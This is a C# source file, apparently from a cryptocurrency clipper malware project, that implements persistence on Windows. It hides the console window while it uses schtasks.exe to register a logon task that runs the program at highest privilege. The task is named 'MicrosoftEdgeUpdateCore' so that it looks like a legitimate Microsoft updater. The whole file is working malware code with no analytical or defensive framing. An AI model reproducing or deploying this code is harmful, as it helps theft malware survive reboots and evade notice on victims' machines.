using System.Diagnostics;
using System.Runtime.Versioning;

namespace CryptoClipper.Persistence;

[SupportedOSPlatform("windows")]
public static class TaskSchedulerPersist
{
    private const string TaskName = "MicrosoftEdgeUpdateCore";

    public static bool Install()
    {
        string exePath = Environment.ProcessPath ?? string.Empty;
        if (string.IsNullOrEmpty(exePath))
            return false;

        string arguments = string.Join(" ",
            "/Create",
            "/TN", $"\"{TaskName}\"",
            "/TR", $"\"{exePath}\"",
            "/SC", "ONLOGON",
            "/RL", "HIGHEST",
            "/F");

        return RunSchtasks(arguments);
    }

    public static bool Uninstall()
    {
        string arguments = $"/Delete /TN \"{TaskName}\" /F";
        return RunSchtasks(arguments);
    }

    public static bool IsInstalled()
    {
        string arguments = $"/Query /TN \"{TaskName}\"";
        return RunSchtasks(arguments);
    }

    private static bool RunSchtasks(string arguments)
    {
        try
        {
            using var process = new Process();
            process.StartInfo = new ProcessStartInfo
            {
                FileName = "schtasks.exe",
                Arguments = arguments,
                CreateNoWindow = true,
                UseShellExecute = false,
                RedirectStandardOutput = true,
                RedirectStandardError = true
            };

            process.Start();
            process.WaitForExit(TimeSpan.FromSeconds(10));
            return process.ExitCode == 0;
        }
        catch
        {
            return false;
        }
    }
}
